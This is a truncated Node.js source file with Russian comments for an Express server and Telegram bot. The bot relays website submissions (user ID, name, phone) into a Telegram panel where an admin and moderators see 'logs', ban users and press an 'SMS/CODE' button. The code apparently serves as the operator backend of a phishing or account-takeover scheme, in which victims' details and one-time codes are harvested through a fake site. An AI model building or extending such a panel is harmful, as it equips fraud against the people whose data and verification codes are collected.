const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

app.use(express.json()); // важно для сайта

const token = process.env.BOT_TOKEN;

// 🔥 ИЗМЕНЕНО: стабильный запуск polling
const bot = new TelegramBot(token, {
  polling: {
    autoStart: false,
    interval: 2000,
    params: {
      timeout: 10
    }
  }
});

// 🔥 ДОБАВЛЕНО: чистый старт polling
bot.startPolling();

bot.on("polling_error", (error) => {
  console.log("BOT POLLING ERROR:", error.code, error.message);
});

console.log("STARTED");

// ================== РОЛИ ==================
const ADMIN_ID = 8035773808;

const mods = [
  111111111,
  222222222
];

// ================== ПАМЯТЬ ==================
const users = {};
const banned = {};

// ================== СООБЩЕНИЯ ==================
bot.on("message", (msg) => {
  const userId = msg.chat.id;

  if (banned[userId]) {
    return bot.sendMessage(userId, "🚫 доступ запрещён");
  }

  if (msg.text === "/admin") {
    if (msg.chat.id !== ADMIN_ID) {
      return bot.sendMessage(msg.chat.id, "⛔ нет доступа");
    }

    return bot.sendMessage(userId, "🧠 Панель", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "📋 Логи", callback_data: "admin_requests" }],
          [{ text: "🚫 Баны", callback_data: "admin_bans" }],
          [{ text: "📊 Статистика", callback_data: "admin_stats" }]
        ]
      }
    });
  }

  if (msg.text === "/test") {
    const requestId = Date.now();

    users[requestId] = {
      userId: userId
    };

    return bot.sendMessage(userId, "🔥 Новый Лог 👻" + requestId, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🚫 Бан", callback_data: "ban_" + requestId },
            { text: "✅ Разбан", callback_data: "unban_" + requestId }
          ],
          [
            { text: "➡️ SMS/CODE", callback_data: "allow_" + requestId }
          ]
        ]
      }
    });
  }

  bot.sendMessage(userId, "бот работает ✅");
});

// ================== CALLBACK ==================
bot.on("callback_query", (q) => {
  const data = q.data;
  const requestId = data.split("_")[1];
  const user = users[requestId];

  const isAdmin = q.from.id === ADMIN_ID;
  const isMod = mods.includes(q.from.id);

  if (data.startsWith("ban")) {
    if (!isAdmin && !isMod) return;

    if (user) banned[user.userId] = true;
    return bot.answerCallbackQuery(q.id, { text: "🚫 забанен" });
  }

  if (data.startsWith("unban")) {
    if (!isAdmin && !isMod) return;

    if (user) banned[user.userId] = false;
    return bot.answerCallbackQuery(q.id, { text: "✅ разбанен" });
  }

  if (data.startsWith("allow")) {
    if (!isAdmin && !isMod) return;

    return bot.answerCallbackQuery(q.id, { text: "➡️ SMS/CODE" });
  }

  if (data === "admin_requests") {
    const list = Object.entries(users)
      .map(([id, u]) => `ID ${id} → ${u.userId}`)
      .join("\n") || "пусто";

    return bot.sendMessage(q.message.chat.id, list);
  }

  if (data === "admin_bans") {
    const list = Object.keys(banned).join("\n") || "нет банов";
    return bot.sendMessage(q.message.chat.id, list);
  }

  if (data === "admin_stats") {
    return bot.sendMessage(
      q.message.chat.id,
      `📊 Статистика:\n\nЛоги: ${Object.keys(users).length}\nБаны: ${Object.keys(banned).length}`
    );
  }

  bot.answerCallbackQuery(q.id);
});

// ================== SITE API ==================
app.post("/submit", (req, res) => {
  const data = req.body;

  const requestId = Date.now();

  users[requestId] = {
    userId: data.userId || "site_user",
    name: data.name || "no name",
    phone
